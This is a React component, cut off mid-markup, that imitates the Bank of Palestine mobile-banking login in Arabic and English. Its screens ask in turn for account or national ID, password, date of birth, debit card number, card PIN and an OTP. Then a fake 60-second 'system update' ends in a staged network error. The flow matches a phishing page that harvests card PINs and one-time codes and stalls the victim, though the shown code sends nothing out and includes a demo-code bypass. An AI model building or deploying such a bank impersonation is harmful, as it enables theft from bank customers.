import React, { useState, useEffect } from 'react';
import { 
  X, 
  MapPin, 
  PhoneCall, 
  HelpCircle, 
  CreditCard, 
  CheckCircle, 
  ArrowLeft, 
  ShieldAlert, 
  AlertCircle, 
  RefreshCw,
  Lock,
  UserCheck,
  WifiOff,
  AlertTriangle
} from 'lucide-react';
import { Language } from '../types';

interface PalestineLoginFlowProps {
  lang: Language;
  onClose: () => void;
  onSuccess?: (username: string) => void;
}

type ScreenState = 
  | 'INITIAL_ACCOUNT_ID' 
  | 'USERNAME_PASSWORD' 
  | 'REGISTER_ACCOUNT_INFO' 
  | 'REGISTER_DEBIT_CARD' 
  | 'OTP_SCREEN' 
  | 'SYSTEM_UPDATES';

export default function PalestineLoginFlow({ lang, onClose, onSuccess }: PalestineLoginFlowProps) {
  const [currentScreen, setCurrentScreen] = useState<ScreenState>('INITIAL_ACCOUNT_ID');
  const [screenHistory, setScreenHistory] = useState<ScreenState[]>([]);
  const [currentLang, setCurrentLang] = useState<Language>(lang);

  // States for System Updates Loading & Network Error
  const [updateStage, setUpdateStage] = useState<'LOADING' | 'NETWORK_ERROR'>('LOADING');
  const [secondsLeft, setSecondsLeft] = useState(60);

  // Form Inputs
  const [accountIdOrNationalId, setAccountIdOrNationalId] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  // Registration A Inputs (Account info)
  const [regUser, setRegUser] = useState('');
  const [regBranch, setRegBranch] = useState('الفرع الرئيسي - رام الله');
  const [regAccountNo, setRegAccountNo] = useState('');
  const [regNationalId, setRegNationalId] = useState('');
  const [regDob, setRegDob] = useState('');
  const [regMobile, setRegMobile] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regAgreed, setRegAgreed] = useState(false);

  // Registration B Inputs (Debit card)
  const [cardUser, setCardUser] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [cardMobile, setCardMobile] = useState('');
  const [cardEmail, setCardEmail] = useState('');
  const [cardAgreed, setCardAgreed] = useState(false);

  // OTP State
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [simulatedOtp, setSimulatedOtp] = useState('1234');

  // Navigate to a new screen and save history
  const navigateTo = (nextScreen: ScreenState) => {
    setScreenHistory(prev => [...prev, currentScreen]);
    setCurrentScreen(nextScreen);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Go back to the previous screen
  const navigateBack = () => {
    if (screenHistory.length > 0) {
      const prev = screenHistory[screenHistory.length - 1];
      setScreenHistory(prevHistory => prevHistory.slice(0, -1));
      setCurrentScreen(prev);
    } else {
      onClose();
    }
  };

  const handleLanguageToggle = () => {
    setCurrentLang(prev => prev === 'ar' ? 'en' : 'ar');
  };

  // Countdown Timer for the System Update -> Network Error Simulation
  useEffect(() => {
    let intervalId: any;
    if (currentScreen === 'SYSTEM_UPDATES' && updateStage === 'LOADING') {
      intervalId = setInterval(() => {
        setSecondsLeft((prev) => {
          if (prev <= 1) {
            clearInterval(intervalId);
            setUpdateStage('NETWORK_ERROR');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [currentScreen, updateStage]);

  // Submit initial Account or ID screen
  const handleInitialSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!accountIdOrNationalId.trim()) return;
    
    // Proceed to Step 2: Username & Password
    navigateTo('USERNAME_PASSWORD');
  };

  // Submit Username & Password login
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) return;

    // Generate random 4-digit OTP for simulation
    const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
    setSimulatedOtp(genOtp);
    navigateTo('OTP_SCREEN');
  };

  // Submit Account Info Registration
  const handleRegAccountSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!regUser || !regAccountNo || !regNationalId || !regMobile || !regAgreed) {
      alert(currentLang === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة والموافقة على الشروط.' : 'Please fill all fields and agree to the terms.');
      return;
    }
    const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
    setSimulatedOtp(genOtp);
    navigateTo('OTP_SCREEN');
  };

  // Submit Debit Card Registration
  const handleRegCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardUser || !cardNumber || !cardPin || !cardMobile || !cardAgreed) {
      alert(currentLang === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة والموافقة على الشروط.' : 'Please fill all fields and agree to the terms.');
      return;
    }
    const genOtp = Math.floor(1000 + Math.random() * 9000).toString();
    setSimulatedOtp(genOtp);
    navigateTo('OTP_SCREEN');
  };

  // Submit OTP Verification
  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!otpCode) return;

    if (otpCode === simulatedOtp || otpCode === '1234' || otpCode === '1111') {
      setSecondsLeft(60);
      setUpdateStage('LOADING');
      navigateTo('SYSTEM_UPDATES');
    } else {
      setOtpError(currentLang === 'ar' ? 'رمز الأمان المدخل غير صحيح. يرجى إدخال الرمز الصحيح أو "1234" للمحاكاة.' : 'Incorrect OTP. Use the correct digits or "1234" to simulate.');
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-md flex items-center justify-center p-2 sm:p-4 overflow-y-auto">
      {/* Sleek smartphone device enclosure for high fidelity layout */}
      <div 
        id="bop-smartphone-container"
        className="relative w-full max-w-[430px] bg-slate-50 rounded-[40px] shadow-[0_25px_60px_-15px_rgba(0,0,0,0.5)] border-[8px] border-neutral-900 overflow-hidden flex flex-col h-[90vh] max-h-[850px] animate-scale-up text-right"
        dir={currentLang === 'ar' ? 'rtl' : 'ltr'}
      >
        {/* Phone Notch/Dynamic Island Accent */}
        <div className="absolute top-0 left-1/2 transform -translate-x-1/2 w-32 h-6 bg-black rounded-b-2xl z-50 flex items-center justify-center">
          <div className="w-16 h-1.5 bg-neutral-800 rounded-full" />
        </div>

        {/* Custom Header Bar inside Phone Screen */}
        <div className="bg-white px-5 pt-7 pb-4 flex items-center justify-between border-b border-gray-100 shrink-0">
          {/* Back Button or Close */}
          {currentScreen !== 'INITIAL_ACCOUNT_ID' && currentScreen !== 'SYSTEM_UPDATES' ? (
            <button 
              onClick={navigateBack}
              className="p-1.5 hover:bg-gray-100 rounded-full transition-colors text-gray-500 cursor-pointer flex items-center"
              title="رجوع"
            >
              <ArrowLeft className={`w-5 h-5 ${currentLang === 'ar' ? '' : 'transform rotate-180'}`} />
            </button>
          ) : (
            <button 
              onClick={onClose}
              className="p-1.5 hover:bg-rose-50 text-gray-400 hover:text-rose-600 rounded-full transition-colors cursor-pointer"
              title="إغلاق"
            >
              <X className="w-5 h-5" />
            </button>
          )}

          {/* Center Brand / App Title */}
          <div className="flex flex-col items-center flex-1">
            <span className="text-sm font-black text-[#b01165] tracking-wide font-sans">
              {currentLang === 'ar' ? 'بنك فلسطين' : 'Bank of Palestine'}
            </span>
          </div>

          {/* En/Ar Language Switcher */}
          <button 
            onClick={handleLanguageToggle}
            className="bg-[#b01165] hover:bg-[#8e0d51] text-white text-[11px] font-black px-3 py-1 rounded transition-colors uppercase cursor-pointer shadow-sm"
          >
            {currentLang === 'ar' ? 'En' : 'العربية'}
          </button>
        </div>

        {/* Dynamic Screen Content Wrapper */}
        <div className="flex-1 overflow-y-auto px-6 py-4 flex flex-col justify-between space-y-6 bg-white scrollbar-none">
          
          {/* ==================== SCREEN 1: INITIAL ACCOUNT OR NATIONAL ID ==================== */}
          {currentScreen === 'INITIAL_ACCOUNT_ID' && (
            <div className="space-y-6 flex-1 flex flex-col justify-between animate-fade-in">
              <div className="space-y-5">
                {/* Greeting Header */}
                <div className="text-center space-y-2 mt-2">
                  <h2 className="text-[#b01165] text-2xl font-black">
                    {currentLang === 'ar' ? 'مرحباً!' : 'Welcome!'}
                  </h2>
                  <p className="text-sm sm:text-base font-extrabold text-gray-800 px-4 leading-relaxed">
                    {currentLang === 'ar' ? 'مرحباً بك في تطبيق الموبيل البنكي الجديد' : 'Welcome to the New Mobile Banking App'}
                  </p>
                </div>

                {/* Input Form */}
                <form onSubmit={handleInitialSubmit} className="space-y-4 pt-2">
                  <div className="space-y-2 text-right">
                    <label className="block text-xs font-black text-gray-700">
                      {currentLang === 'ar' ? 'رقم الحساب | رقم الهوية' : 'Account Number | National ID'}
                    </label>
                    <input 
                      type="text" 
                      required
                      value={accountIdOrNationalId}
                      onChange={(e) => setAccountIdOrNationalId(e.target.value)}
                      placeholder={currentLang === 'ar' ? 'أدخل رقم الحساب أو رقم الهوية' : 'Enter Account or National ID'}
                      className="w-full bg-slate-50 border border-gray-200 focus:border-[#b01165] focus:ring-1 focus:ring-[#b01165] focus:outline-none rounded-xl px-4 py-3.5 text-xs sm:text-sm font-bold transition-all text-right"
                    />
                  </div>

                  {/* Buttons */}
                  <div className="space-y-3 pt-2">
                    <button 
                      type="submit"
                      disabled={!accountIdOrNationalId.trim()}
                      className="w-full bg-[#b01165]/90 hover:bg-[#b01165] text-white font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-1 cursor-pointer disabled:opacity-50"
                    >
                      {currentLang === 'ar' ? 'التالي' : 'Next'}
                    </button>

                    <button 
                      type="button"
                      onClick={() => navigateTo('REGISTER_ACCOUNT_INFO')}
                      className="w-full border-2 border-[#b01165] text-[#b01165] hover:bg-rose-50 font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all flex items-center justify-center gap-1 cursor-pointer"
                    >
                      {currentLang === 'ar' ? 'انضم لعائلة بنكي' : 'Join Bank Family (Register)'}
                    </button>
                  </div>
                </form>

                {/* Register Debit card shortcut */}
                <div className="text-center">
                  <button 
                    onClick={() => navigateTo('REGISTER_DEBIT_CARD')}
                    className="text-xs font-black text-[#b01165] hover:underline"
                  >
                    {currentLang === 'ar' ? 'تسجيل جديد باستخدام بطاقة الخصم مباشرة ←' : 'New Registration via Debit Card directly ←'}
                  </button>
                </div>

                {/* Terms and conditions link */}
                <div className="text-center pt-2">
                  <a href="#terms" className="text-xs text-gray-500 font-bold underline hover:text-black">
                    {currentLang === 'ar' ? 'الشروط والأحكام' : 'Terms & Conditions'}
                  </a>
                </div>
              </div>

              {/* Quick links & Banner at the bottom */}
              <div className="space-y-4 pt-4 mt-auto border-t border-gray-100">
                <BottomQuickLinks lang={currentLang} />
                <BottomBanner lang={currentLang} />
              </div>
            </div>
          )}

          {/* ==================== SCREEN 2: USERNAME & PASSWORD LOGIN ==================== */}
          {currentScreen === 'USERNAME_PASSWORD' && (
            <div className="space-y-6 flex-1 flex flex-col justify-between animate-fade-in">
              <div className="space-y-5">
                <div className="text-center space-y-1">
                  <h2 className="text-[#b01165] text-xl font-black">
                    {currentLang === 'ar' ? 'تسجيل الدخول' : 'Sign In'}
                  </h2>
                  <p className="text-xs text-gray-400 font-bold">
                    {currentLang === 'ar' ? 'أدخل تفاصيل الأمان للمتابعة آمنة' : 'Enter security credentials to log in safely'}
                  </p>
                </div>

                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div className="space-y-1.5 text-right">
                    <label className="block text-xs font-black text-gray-700">
                      {currentLang === 'ar' ? 'اسم المستخدم' : 'Username'}
                    </label>
                    <input 
                      type="text" 
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder={currentLang === 'ar' ? 'أدخل اسم المستخدم' : 'Enter username'}
                      className="w-full bg-slate-50 border border-gray-200 focus:border-[#b01165] focus:ring-1 focus:ring-[#b01165] focus:outline-none rounded-xl px-4 py-3 text-xs font-bold transition-all text-right"
                    />
                    <div className="text-right">
                      <a href="#forgot" className="text-[10px] text-gray-500 font-bold hover:underline">
                        {currentLang === 'ar' ? 'هل نسيت اسم المستخدم؟' : 'Forgot Username?'}
                      </a>
                    </div>
                  </div>

                  <div className="space-y-1.5 text-right">
                    <label className="block text-xs font-black text-gray-700">
                      {currentLang === 'ar' ? 'كلمة المرور' : 'Password'}
                    </label>
                    <input 
                      type="password" 
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder={currentLang === 'ar' ? 'أدخل كلمة المرور' : 'Enter password'}
                      className="w-full bg-slate-50 border border-gray-200 focus:border-[#b01165] focus:ring-1 focus:ring-[#b01165] focus:outline-none rounded-xl px-4 py-3 text-xs font-bold transition-all text-right"
                    />
                    <div className="text-right">
                      <a href="#forgot-pw" className="text-[10px] text-gray-500 font-bold hover:underline">
                        {currentLang === 'ar' ? 'هل نسيت كلمة المرور؟' : 'Forgot Password?'}
                      </a>
                    </div>
                  </div>

                  <button 
                    type="submit"
                    className="w-full bg-[#b01165] hover:bg-[#8e0d51] text-white font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all shadow-md mt-4 cursor-pointer"
                  >
                    {currentLang === 'ar' ? 'تسجيل الدخول' : 'Sign In'}
                  </button>
                </form>

                <div className="text-center space-y-1 pt-1">
                  <div>
                    <a href="#terms" className="text-xs text-gray-500 font-bold underline hover:text-black">
                      {currentLang === 'ar' ? 'الشروط والأحكام' : 'Terms & Conditions'}
                    </a>
                  </div>
                  <div>
                    <a href="#merchant" className="text-xs text-gray-900 font-extrabold hover:text-[#b01165] block pt-1">
                      {currentLang === 'ar' ? 'الدفع لتاجر' : 'Pay a Merchant'}
                    </a>
                  </div>
                </div>
              </div>

              {/* Quick links at the bottom */}
              <div className="space-y-4 pt-4 mt-auto border-t border-gray-100">
                <BottomQuickLinks lang={currentLang} />
              </div>
            </div>
          )}

          {/* ==================== SCREEN 3: REGISTER WITH ACCOUNT INFO ==================== */}
          {currentScreen === 'REGISTER_ACCOUNT_INFO' && (
            <div className="space-y-5 flex-1 flex flex-col justify-between animate-fade-in">
              <div className="space-y-4">
                <div className="text-center space-y-1">
                  <h2 className="text-[#b01165] text-lg sm:text-xl font-black">
                    {currentLang === 'ar' ? 'التسجيل باستخدام معلومات الحساب' : 'Register with Account Info'}
                  </h2>
                  <p className="text-[11px] text-gray-400 font-bold">
                    {currentLang === 'ar' ? 'يرجى تزويد البيانات المطلوبة بدقة' : 'Please provide accurate banking profile info'}
                  </p>
                </div>

                <form onSubmit={handleRegAccountSubmit} className="space-y-3.5 text-right">
                  {/* Username */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'اسم المستخدم ( 5-20 حرف )' : 'Username (5-20 characters)'}
                    </label>
                    <input 
                      type="text" 
                      required
                      value={regUser}
                      onChange={(e) => setRegUser(e.target.value)}
                      placeholder={currentLang === 'ar' ? 'اسم المستخدم المقترح' : 'Suggested username'}
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors"
                    />
                  </div>

                  {/* Branch select */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'اختر فرع' : 'Select Branch'}
                    </label>
                    <select
                      value={regBranch}
                      onChange={(e) => setRegBranch(e.target.value)}
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors"
                    >
                      <option value="الفرع الرئيسي - رام الله">{currentLang === 'ar' ? 'الفرع الرئيسي - رام الله' : 'Main Branch - Ramallah'}</option>
                      <option value="فرع غزة">{currentLang === 'ar' ? 'فرع غزة' : 'Gaza Branch'}</option>
                      <option value="فرع نابلس">{currentLang === 'ar' ? 'فرع نابلس' : 'Nablus Branch'}</option>
                      <option value="فرع الخليل">{currentLang === 'ar' ? 'فرع الخليل' : 'Hebron Branch'}</option>
                      <option value="فرع بيت لحم">{currentLang === 'ar' ? 'فرع بيت لحم' : 'Bethlehem Branch'}</option>
                    </select>
                  </div>

                  {/* Account number */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رقم الحساب (5-7 ارقام)' : 'Account Number (5-7 digits)'}
                    </label>
                    <input 
                      type="text" 
                      required
                      maxLength={7}
                      value={regAccountNo}
                      onChange={(e) => setRegAccountNo(e.target.value.replace(/\D/g, ''))}
                      placeholder="1234567"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* National ID */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رقم الهوية' : 'National ID'}
                    </label>
                    <input 
                      type="text" 
                      required
                      maxLength={9}
                      value={regNationalId}
                      onChange={(e) => setRegNationalId(e.target.value.replace(/\D/g, ''))}
                      placeholder="999999999"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Date of Birth */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'تاريخ الميلاد' : 'Date of Birth'}
                    </label>
                    <input 
                      type="date" 
                      required
                      value={regDob}
                      onChange={(e) => setRegDob(e.target.value)}
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors"
                    />
                  </div>

                  {/* Mobile number */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رقم الموبايل' : 'Mobile Number'}
                    </label>
                    <input 
                      type="tel" 
                      required
                      value={regMobile}
                      onChange={(e) => setRegMobile(e.target.value)}
                      placeholder="+970 599 000 000"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Email address */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'البريد الإلكتروني' : 'Email Address'}
                    </label>
                    <input 
                      type="email" 
                      required
                      value={regEmail}
                      onChange={(e) => setRegEmail(e.target.value)}
                      placeholder="client@bop.ps"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Checkbox agreed */}
                  <div className="flex items-center gap-2 pt-2 justify-start">
                    <input 
                      type="checkbox" 
                      id="reg-agreed" 
                      checked={regAgreed}
                      onChange={(e) => setRegAgreed(e.target.checked)}
                      className="w-4.5 h-4.5 text-[#b01165] border-gray-300 rounded focus:ring-[#b01165]"
                    />
                    <label htmlFor="reg-agreed" className="text-xs font-bold text-gray-600 cursor-pointer select-none">
                      {currentLang === 'ar' ? 'أوافق على الشروط والأحكام' : 'I agree to the Terms & Conditions'}
                    </label>
                  </div>

                  <button 
                    type="submit"
                    className="w-full bg-[#b01165] hover:bg-[#8e0d51] text-white font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all shadow-md mt-6 cursor-pointer"
                  >
                    {currentLang === 'ar' ? 'تسجيل' : 'Register'}
                  </button>
                </form>
              </div>

              {/* Debit Card Switcher Link */}
              <div className="text-center py-3 border-t border-gray-100">
                <button 
                  onClick={() => navigateTo('REGISTER_DEBIT_CARD')}
                  className="text-xs font-black text-[#b01165] hover:underline"
                >
                  {currentLang === 'ar' ? 'هل تملك بطاقة صراف؟ سجل بواسطة البطاقة ←' : 'Have a Debit card? Register with card instead ←'}
                </button>
              </div>
            </div>
          )}

          {/* ==================== SCREEN 4: REGISTER WITH DEBIT CARD ==================== */}
          {currentScreen === 'REGISTER_DEBIT_CARD' && (
            <div className="space-y-5 flex-1 flex flex-col justify-between animate-fade-in">
              <div className="space-y-4">
                <div className="text-center space-y-1">
                  <h2 className="text-[#b01165] text-lg sm:text-xl font-black">
                    {currentLang === 'ar' ? 'التسجيل باستخدام بطاقة الخصم' : 'Register with Debit Card'}
                  </h2>
                  <p className="text-[11px] text-gray-400 font-bold">
                    {currentLang === 'ar' ? 'قم بتسجيل حسابك باستخدام معلومات بطاقتك مباشرة' : 'Set up access using card details immediately'}
                  </p>
                </div>

                <form onSubmit={handleRegCardSubmit} className="space-y-4 text-right">
                  {/* Username */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'اسم المستخدم ( 5-20 حرف )' : 'Username (5-20 characters)'}
                    </label>
                    <input 
                      type="text" 
                      required
                      value={cardUser}
                      onChange={(e) => setCardUser(e.target.value)}
                      placeholder={currentLang === 'ar' ? 'اسم المستخدم المقترح' : 'Suggested username'}
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors"
                    />
                  </div>

                  {/* Card number */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رقم البطاقة' : 'Card Number'}
                    </label>
                    <input 
                      type="text" 
                      required
                      maxLength={16}
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ''))}
                      placeholder="4000 1234 5678 9010"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Card Pin code (رمز البطاقة) */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رمز البطاقة (الرقم السري)' : 'Card PIN Code'}
                    </label>
                    <input 
                      type="password" 
                      required
                      maxLength={4}
                      value={cardPin}
                      onChange={(e) => setCardPin(e.target.value.replace(/\D/g, ''))}
                      placeholder="••••"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Mobile */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'رقم الموبايل' : 'Mobile Number'}
                    </label>
                    <input 
                      type="tel" 
                      required
                      value={cardMobile}
                      onChange={(e) => setCardMobile(e.target.value)}
                      placeholder="+970 599 000 000"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Email */}
                  <div className="space-y-1">
                    <label className="block text-[11px] font-black text-gray-600">
                      {currentLang === 'ar' ? 'البريد الإلكتروني' : 'Email Address'}
                    </label>
                    <input 
                      type="email" 
                      required
                      value={cardEmail}
                      onChange={(e) => setCardEmail(e.target.value)}
                      placeholder="client@bop.ps"
                      className="w-full bg-transparent border-b-2 border-gray-200 focus:border-[#b01165] focus:outline-none py-1.5 text-xs sm:text-sm font-bold text-right transition-colors font-mono"
                    />
                  </div>

                  {/* Checkbox agreed */}
                  <div className="flex items-center gap-2 pt-2 justify-start">
                    <input 
                      type="checkbox" 
                      id="card-agreed" 
                      checked={cardAgreed}
                      onChange={(e) => setCardAgreed(e.target.checked)}
                      className="w-4.5 h-4.5 text-[#b01165] border-gray-300 rounded focus:ring-[#b01165]"
                    />
                    <label htmlFor="card-agreed" className="text-xs font-bold text-gray-600 cursor-pointer select-none">
                      {currentLang === 'ar' ? 'أوافق على الشروط والأحكام' : 'I agree to the Terms & Conditions'}
                    </label>
                  </div>

                  <button 
                    type="submit"
                    className="w-full bg-[#b01165] hover:bg-[#8e0d51] text-white font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all shadow-md mt-6 cursor-pointer"
                  >
                    {currentLang === 'ar' ? 'تسجيل' : 'Register'}
                  </button>
                </form>
              </div>

              {/* Account Switcher Link */}
              <div className="text-center py-3 border-t border-gray-100">
                <button 
                  onClick={() => navigateTo('REGISTER_ACCOUNT_INFO')}
                  className="text-xs font-black text-[#b01165] hover:underline"
                >
                  {currentLang === 'ar' ? 'سجل باستخدام رقم ومعلومات الحساب بدلاً من ذلك ←' : 'Register using Account info instead ←'}
                </button>
              </div>
            </div>
          )}

          {/* ==================== SCREEN 5: OTP VERIFICATION PAGE ==================== */}
          {currentScreen === 'OTP_SCREEN' && (
            <div className="space-y-6 flex-1 flex flex-col justify-between animate-fade-in py-3">
              <div className="space-y-5">
                <div className="text-center space-y-2">
                  <div className="w-14 h-14 bg-rose-50 text-[#b01165] rounded-full flex items-center justify-center mx-auto mb-2 border border-rose-100">
                    <Lock className="w-6 h-6 animate-pulse" />
                  </div>
                  <h2 className="text-[#b01165] text-xl font-black">
                    {currentLang === 'ar' ? 'صفحة رمز التحقق المؤقت (OTP)' : 'OTP Security Code'}
                  </h2>
                  <p className="text-xs text-gray-500 font-extrabold px-3 leading-relaxed">
                    {currentLang === 'ar' 
                      ? 'تم إرسال رمز أمان مؤقت برسالة نصية إلى رقم الموبايل المسجل لدينا لتأكيد هويتك ومتابعة الطلب.' 
                      : 'A temporary security OTP code has been dispatched via SMS to your registered mobile line.'}
                  </p>
                </div>

                {/* Simulated alert banner */}
                <div className="bg-amber-50 border border-amber-200/60 rounded-xl p-3 text-center space-y-1">
                  <span className="text-[10px] font-black text-amber-800 uppercase tracking-wider block">
                    {currentLang === 'ar' ? 'رمز الأمان والمحاكاة لسهولة التجربة' : 'SMS DEMO CODE'}
                  </span>
                  <span className="text-2xl font-mono font-black tracking-widest text-[#b01165] block animate-bounce pt-1">
                    {simulatedOtp}
                  </span>
                  <p className="text-[10px] text-amber-900/80 font-bold">
                    {currentLang === 'ar' 
                      ? '📱 أدخل الرمز الظاهر أعلاه أو "1234" للمتابعة السريعة.' 
                      : '📱 Enter the digits above or use "1234" to skip.'}
                  </p>
                </div>

                <form onSubmit={handleOtpSubmit} className="space-y-4">
                  <div className="space-y-1 text-center">
                    <label className="block text-xs font-black text-gray-700 mb-1">
                      {currentLang === 'ar' ? 'أدخل رمز الأمان المؤقت' : 'Enter security verification OTP'}
                    </label>
                    <input 
                      type="text" 
                      required
                      maxLength={6}
                      value={otpCode}
                      onChange={(e) => {
                        setOtpCode(e.target.value.replace(/\D/g, ''));
                        setOtpError('');
                      }}
                      placeholder="0 0 0 0"
                      className="w-48 mx-auto bg-slate-50 border border-gray-200 focus:border-[#b01165] focus:outline-none rounded-xl py-3 text-center text-xl font-black tracking-widest font-mono block"
                    />
                  </div>

                  {otpError && (
                    <div className="text-xs text-red-600 font-bold text-center flex items-center justify-center gap-1">
                      <AlertCircle className="w-4 h-4 shrink-0" />
                      <span>{otpError}</span>
                    </div>
                  )}

                  <button 
                    type="submit"
                    className="w-full bg-[#b01165] hover:bg-[#8e0d51] text-white font-black text-xs sm:text-sm py-3.5 rounded-xl transition-all shadow-md cursor-pointer"
                  >
                    {currentLang === 'ar' ? 'تأكيد الرمز والمتابعة' : 'Verify & Complete'}
                  </button>
                </form>

                <div className="text-center pt-2">
                  <button 
                    type="button" 
                    onClick={() => {
                      const g = Math.floor(1000 + Math.random() * 9000).toString();
                      setSimulatedOtp(g);
                      alert(currentLang === 'ar' ? 'تم إعادة إرسال رمز الأمان بنجاح.' : 'A new security code has been simulated.');
                    }}
                    className="text-xs font-bold text-gray-500 hover:text-[#b01165] underline flex items-center justify-center gap-1 mx-auto cursor-pointer"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>{currentLang === 'ar' ? 'إعادة إرسال رمز الأمان' : 'Resend Security Code'}</span>
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* ==================== SCREEN 6: SYSTEM UNDERGOING UPDATES ==================== */}
          {currentScreen === 'SYSTEM_UPDATES' && (
            <div className="space-y-6 flex-1 flex flex-col justify-between animate-fade-in py-6">
              {updateStage === 'LOADING' ? (
                <div className="space-y-6 flex-1 flex flex-col items-center justify-center text-center py-4">
                  <div className="w-20 h-20 bg-rose-50 text-[#b01165] rounded-full flex items-center justify-center mb-2 shadow-inner border border-rose-100 relative">
                    <RefreshCw className="w-10 h-10 animate-spin text-[#b01165]" />
                    <span className="absolute bottom-1 text-[10px] font-black text-rose-800 font-mono">
                      {secondsLeft}s
                    </span>
                  </div>

                  <div className="space-y-2">
                    <h2 className="text-[#b01165] text-xl font-black leading-tight">
                      {currentLang === 'ar' ? 'جاري فحص وتحديث النظام' : 'Verifying & Updating System'}
                    </h2>
                    <p className="text-xs text-gray-500 font-extrabold px-3 leading-relaxed">
                      {currentLang === 'ar' 
                        ? 'يرجى الانتظار حتى نتحقق من سلامة البيانات وتهيئة محفظتك المصرفية المشفرة.' 
                        : 'Please wait while we verify data integrity and initialize your encrypted mobile banking vault.'}
                    </p>
                  </div>

                  {/* Progress bar and countdown */}
                  <div className="w-full max-w-xs bg-slate-100 p-4 rounded-2xl border border-gray-150 space-y-2.5">
                    <div className="flex justify-between items-center text-xs font-black text-gray-700">
                      <span>{currentLang === 'ar' ? 'التقدم المتبقي:' : 'Progress remaining:'}</span>
                      <span className="font-mono text-[#b01165]">{secondsLeft} {currentLang === 'ar' ? 'ثانية' : 'sec'}</span>
                    </div>

                    <div className="w-full bg-gray-200 h-2.5 rounded-full overflow-hidden">
                      <div 
                        className="bg-[#b01165] h-full transition-all duration-1000 ease-linear rounded-full" 
                        style={{ width: `${((60 - secondsLeft) / 60) * 100}%` }}
                      />
                    </div>

                    <div className="text-center">
                      <span className="text-[11px] font-mono font-black text-gray-400">
                        {Math.floor(((60 - secondsLeft) / 60) * 100)}% {currentLang === 'ar' ? 'تم اكتماله' : 'completed'}
                      </span>
                    </div>
                  </div>

                  <div className="bg-slate-50 border border-gray-200/85 rounded-2xl p-4 max-w-xs">
